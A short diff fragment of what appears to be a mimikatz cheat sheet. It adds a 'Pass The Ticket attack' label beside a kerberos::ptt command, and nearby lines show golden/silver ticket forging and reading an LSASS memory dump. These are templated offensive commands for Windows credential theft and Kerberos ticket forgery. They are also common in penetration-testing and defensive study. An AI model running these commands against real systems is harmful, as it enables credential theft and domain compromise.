@@ -18,7 +18,7 @@ mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> 
  (Silver ticket)
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-mimikatz # kerberos::ptt /ticket:<ticket_file>.kirbi
+mimikatz # kerberos::ptt /ticket:<ticket_file>.kirbi                (Pass The Ticket attack)
 
 -------------------------------------------------------------------------
 mimikatz # sekurlsa::minidump lsass.dmp  (Dump LSASS memory - Advanced)
